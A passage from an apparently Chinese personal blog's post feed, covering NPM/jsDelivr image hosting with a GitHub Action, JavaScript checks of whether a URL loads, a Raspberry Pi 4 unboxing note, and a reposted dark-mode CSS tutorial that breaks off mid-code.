src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span 